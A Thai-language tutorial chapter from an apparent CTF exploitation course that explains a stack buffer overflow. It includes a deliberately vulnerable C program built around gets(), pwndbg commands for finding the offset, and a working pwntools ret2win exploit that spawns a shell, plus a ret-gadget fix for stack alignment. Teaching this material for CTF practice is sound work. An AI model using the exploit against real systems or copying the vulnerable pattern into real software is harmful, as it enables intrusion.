# บท 3 — Buffer Overflow → ควบคุม RIP

บทนี้เอาความรู้เรื่อง stack มาใช้จริง เป้าหมายเดียว: **เขียนทับ return
address ให้ RIP เป็นค่าที่เราต้องการ**

## โจทย์ตัวอย่าง

```c
#include <stdio.h>

void win() {
    puts("คุณควบคุม RIP ได้แล้ว! 🎉");
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    puts("พิมพ์อะไรมาสักหน่อย: ");
    gets(buf);          // ← ช่องโหว่: ไม่จำกัดขนาด input
}

int main() {
    vuln();
    return 0;
}
```

`gets()` รับ input ไม่จำกัดขนาด แต่ `buf` มีแค่ 64 ไบต์ → เขียนเกินได้

## แผนการโจมตี

1. เขียนขยะเต็ม buffer 64 ไบต์
2. เขียนทับ saved RBP อีก 8 ไบต์
3. เขียนทับ return address ด้วย address ของ `win()`

รวมเป็น: `[ขยะ 64+8 = 72 ไบต์][address ของ win]`

ตัวเลข 72 นี้เรียกว่า **offset** — ระยะจาก buffer ถึง return address

## หา offset ด้วย cyclic

ไม่ต้องเดา offset ให้ pwntools ช่วย สร้าง pattern ที่ไม่ซ้ำ:

```bash
pwndbg> cyclic 200          # สร้าง pattern 200 ไบต์
aaaabaaacaaadaaaeaaaf...

pwndbg> run                 # แล้ว paste pattern เข้าไปตอนโปรแกรมถาม
```

โปรแกรมจะ crash เพราะ return address กลายเป็นขยะ ดูค่าที่ทำให้ crash:

```bash
pwndbg> info registers rsp
# หรือดูค่าใน RSP ตอน crash

pwndbg> cyclic -l 0x6161616c    # เอาค่าที่เจอมาหาว่าอยู่ offset ไหน
72
```

ได้ offset = **72** ตรงกับที่คำนวณ (64 + 8)

> **ทำไมต้อง cyclic:** บางโจทย์ compiler จัด stack ไม่ตรงกับที่คิด
> (มี padding เพิ่ม) การใช้ cyclic แม่นกว่าเดาเสมอ

## หา address ของ win()

```bash
pwndbg> print win
$1 = {void ()} 0x401156 <win>

# หรือ
$ objdump -d vuln | grep win
0000000000401156 <win>:
```

ได้ address = `0x401156`

## เขียน exploit

```python
from pwn import *

# ตั้งค่า context ให้ตรงกับ binary (arch สำคัญ)
context.binary = elf = ELF('./vuln')

p = process('./vuln')          # รันโปรแกรมในเครื่อง
# p = remote('host', 1337)     # หรือต่อ server ตอนส่งจริง

offset = 72
win_addr = elf.symbols['win']  # ให้ pwntools หา address ให้ = 0x401156

payload = b'A' * offset        # ขยะเต็ม buffer + saved RBP
payload += p64(win_addr)       # เขียนทับ return address

p.sendline(payload)            # ส่ง payload
p.interactive()                # เข้า shell ที่ได้มา
```

รันแล้วได้ shell:

```bash
$ python3 exploit.py
[+] Starting local process './vuln': pid 12345
[*] Switching to interactive mode
คุณควบคุม RIP ได้แล้ว! 🎉
$ whoami
```

## กับดักที่เจอบ่อย

### 1. Stack alignment (movaps issue)
บางครั้งเรียก `system()` แล้ว crash ที่คำสั่ง `movaps` เพราะ stack ไม่
align 16 ไบต์ **วิธีแก้:** เพิ่ม `ret` gadget หนึ่งตัวก่อน address ปลายทาง
เพื่อดัน stack ให้ align

```python
ret = 0x40101a          # หา address ของ ret เดี่ยวๆ ด้วย ROPgadget
payload = b'A' * offset
payload += p64(ret)     # ret เปล่าๆ 1 ตัว ปรับ alignment
payload += p64(win_addr)
```

### 2. ใส่ p64 ผิด / ลืม p64
address ต้องแปลงเป็น little-endian ด้วย `p64()` เสมอ ห้ามใส่เลขดิบ

### 3. offset ผิดเพราะไม่ได้ตั้ง context
ถ้าไม่ตั้ง `context.binary` บางฟังก์ชันจะ default เป็น 32-bit ทำให้ p64 ผิด

---

## สรุปบทนี้

- overflow = เขียนเกิน buffer ไปทับ return address
- ใช้ `cyclic` หา offset อย่าเดา
- payload = `b'A'*offset + p64(target)`
- ระวัง stack alignment → เพิ่ม `ret` gadget แก้ได้

โจทย์ที่ทำได้ตอนนี้: picoCTF **buffer overflow 0/1**, **stack overflow** ทั่วไป

บทต่อไป: เจาะ pwntools ให้ใช้คล่อง →
